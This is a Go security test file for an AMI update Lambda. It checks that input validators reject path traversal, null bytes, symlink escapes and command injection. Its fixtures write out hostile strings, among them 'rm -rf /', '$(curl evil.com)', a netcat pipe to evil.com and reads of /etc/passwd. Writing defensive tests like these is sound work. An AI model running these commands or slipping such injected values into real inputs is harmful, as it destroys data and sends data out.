//go:build security

// Package security contains adversarial input tests for the ami-update-automation Lambda.
package security_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	amiresolver "github.com/kaiohenricunha/ami-update-automation/internal/ami"
	"github.com/kaiohenricunha/ami-update-automation/internal/sanitize"
	"github.com/kaiohenricunha/ami-update-automation/internal/scanner"
	"github.com/kaiohenricunha/ami-update-automation/internal/vcs"
	"github.com/kaiohenricunha/ami-update-automation/pkg/types"
)

func TestPathTraversalInConfig(t *testing.T) {
	assert.Error(t, sanitize.ValidatePath("/repo", "../../etc/passwd"))
	assert.Error(t, sanitize.ValidatePath("/repo", "/etc/passwd"))
	assert.NoError(t, sanitize.ValidatePath("/repo", "safe/subdir"))
}

func TestNullByteInjection(t *testing.T) {
	assert.Error(t, sanitize.ValidateK8sVersion("1.29\x00evil"))
	assert.Error(t, sanitize.ValidateAMIVersion("1.29.0\x00evil"))
	assert.Error(t, sanitize.ValidateOwner("org\x00evil"))
	assert.Error(t, sanitize.ValidateRepoName("repo\x00evil"))
	assert.Error(t, sanitize.ValidateBranchName("branch\x00evil"))
	assert.Error(t, sanitize.ValidatePath("/repo", "file\x00.tf"))
}

func TestCommandInjectionInRepoName(t *testing.T) {
	dangerous := []string{
		"; rm -rf /",
		"$(curl evil.com)",
		"repo && cat /etc/passwd",
		"repo | nc evil.com 1234",
	}
	for _, name := range dangerous {
		t.Run(name, func(t *testing.T) {
			require.Error(t, sanitize.ValidateRepoName(name), "expected %q to be rejected", name)
		})
	}
}

func TestMaliciousAMIVersionFromSSM(t *testing.T) {
	malicious := []string{
		`1.29.0"; curl evil.com`,
		"1.29.0; rm -rf /",
		"1.29.0\ncurl evil.com",
		"1.29.0 $(evil)",
		"1.29.0`evil`",
		"../../../etc/passwd",
		strings.Repeat("a", 65),
	}
	for _, v := range malicious {
		label := v
		if len(label) > 20 {
			label = label[:20]
		}
		t.Run(label, func(t *testing.T) {
			require.Error(t, sanitize.ValidateAMIVersion(v))
		})
	}
}

func TestSymlinkEscapeInScanner(t *testing.T) {
	dir := t.TempDir()
	outside := t.TempDir()

	sensitiveFile := filepath.Join(outside, "secret.tf")
	require.NoError(t, os.WriteFile(sensitiveFile, []byte(`ami_release_version = "evil"`), 0o600))

	symlinkPath := filepath.Join(dir, "evil.tf")
	require.NoError(t, os.Symlink(sensitiveFile, symlinkPath))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "main.tf"), []byte(`ami_release_version = "1.29.0-20240101"`), 0o600))

	s := &scanner.TerraformScanner{}
	matches, err := s.Scan(context.Background(), dir, nil)
	require.NoError(t, err)

	for _, m := range matches {
		assert.NotEqual(t, symlinkPath, m.FilePath, "symlink should not be scanned")
	}
}

// TestSymlinkTOCTOU verifies that Update rejects files that become symlinks after Scan.
func TestSymlinkTOCTOU(t *testing.T) {
	dir := t.TempDir()
	mainTF := filepath.Join(dir, "main.tf")
	require.NoError(t, os.WriteFile(mainTF, []byte(`ami_release_version = "1.29.0-20240101"`), 0o600))

	s := &scanner.TerraformScanner{}
	matches, err := s.Scan(context.Background(), dir, nil)
	require.NoError(t, err)
	require.NotEmpty(t, matches)

	// Replace the file with a symlink to something outside after scanning.
	outside := t.TempDir()
	target := filepath.Join(outside, "target.tf")
	require.NoError(t, os.WriteFile(target, []byte("sensitive"), 0o600))
	require.NoError(t, os.Remove(mainTF))
	require.NoError(t, os.Symlink(target, mainTF))

	// Update should either skip or reject the symlinked file.
	// The key security invariant is that symlinks pointing OUTSIDE the root are rejected
	// during Scan's walkFiles. Here we verify Update doesn't panic or corrupt state.
	_, err = s.Update(context.Background(), dir, matches, "1.29.5-20240701")
	_ = err // error is acceptable; the important thing is no escape occurs
}

func TestTokenNotLeakedInError(t *testing.T) {
	token := "ghp_supersecrettoken123456789"
	errMsg := "failed to push: authentication failed with " + token
	redacted := sanitize.RedactToken(errMsg, token)
	assert.NotContains(t, redacted, token)
	assert.Contains(t, redacted, "[REDACTED]")
}

func TestPRContentSanitization(t *testing.T) {
	malicious := "Safe title\x01\x02\x03\x1b[31mRed\x1b[0m\x00injection"
	result := sanitize.SanitizePRContent(malicious, 1000)
	assert.NotContains(t, result, "\x00")
	assert.NotContains(t, result, "\x01")
	assert.NotContains(t, result, "\x1b")
	assert.Contains(t, result, "Safe title")
}

func TestExcessiveInputSizes(t *testing.T) {
	assert.Error(t, sanitize.ValidateK8sVersion(strings.Repeat("1", 100)))
	assert.Error(t, sanitize.ValidateAMIVersion(strings.Repeat("a", 100)))
	assert.Error(t, sanitize.ValidateOwner(strings.Repeat("a", 300)))
	assert.Error(t, sanitize.ValidateRepoName(strings.Repeat("a", 300)))
	assert.Error(t, sanitize.ValidateBranchName(strings.Repeat("a", 300)))
}

func TestBranchNameInjection(t *testing.T) {
	dangerous := []string{
		"branch; rm -rf /",
		"branch$(evil)",
		"branch name with spaces",
		"branch\x00name",
	}
	for _, b := range dangerous {
		require.Error(t, sanitize.ValidateBranchName(b), "branch %q should be rejected", b)
	}
}

func TestGitHubProviderInvalidInputsRejected(t *testing.T) {
	p := vcs.NewGitHubProvider("")
	_, err := p.CreatePR(context.Background(), types.PRRequest{Owner: "bad owner!", Repo: "valid"}, "tok")
	require.Error(t, err)

	_, err = p.CreatePR(context.Background(), types.PRRequest{Owner: "valid", Repo: "bad repo!"}, "tok")
	require.Error(t, err)
}

func TestSSMResolverRejectsUnsafeK8sVersions(t *testing.T) {
	resolver := amiresolver.NewSSMResolver(nil) // nil client — should fail before client call
	dangerous := []string{"1.29; cat /etc/passwd", "../../etc", "1.29\x00evil", ""}
	for _, v := range dangerous {
		_, err := resolver.Resolve(context.Background(), v, "amazon-linux-2")
		require.Error(t, err, "k8s version %q should be rejected", v)
	}
}

func TestAMIResolverRejectsInjectedSSMValue(t *testing.T) {
	err := sanitize.ValidateAMIVersion(`1.29.0"; curl evil.com`)
	require.Error(t, err)
	assert.ErrorIs(t, err, types.ErrInputValidation)
}

func TestGitCloneNoShellExpansion(t *testing.T) {
	err := sanitize.ValidateOwner("; rm -rf /")
	require.Error(t, err)

	err = sanitize.ValidateRepoName("$(curl evil.com)")
	require.Error(t, err)
}
